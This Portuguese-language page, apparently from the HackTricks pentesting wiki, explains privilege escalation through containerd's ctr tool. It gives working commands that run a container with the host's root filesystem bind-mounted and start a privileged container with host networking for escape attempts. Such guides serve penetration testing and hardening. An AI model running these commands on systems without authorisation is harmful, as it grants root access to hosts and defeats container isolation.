# Escalada de privilégios do Containerd (ctr)

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Acesse o link a seguir para saber **onde `containerd` e `ctr` se encaixam na stack de containers**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Se você descobrir que um host contém o comando `ctr`, a CLI nativa incluída no containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Você pode listar as imagens conhecidas pelo containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Então **execute uma dessas imagens com a raiz do host montada recursivamente via bind na raiz do container**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Execute um container em modo privilegiado e teste uma escape.\
Você pode executar um container usando a rede do host da seguinte forma:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` concede ao processo as capabilities efetivas do Linux do caller e remove vários controles de isolamento, mas um escape ainda depende do ambiente; use as técnicas mencionadas na página a seguir para testá-lo:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Primeiros passos com containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementação do comando `ctr image`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementação do comando `ctr run`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Documentação do shared-subtree do kernel Linux](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Pacote OCI do containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flags do comando `ctr` do containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
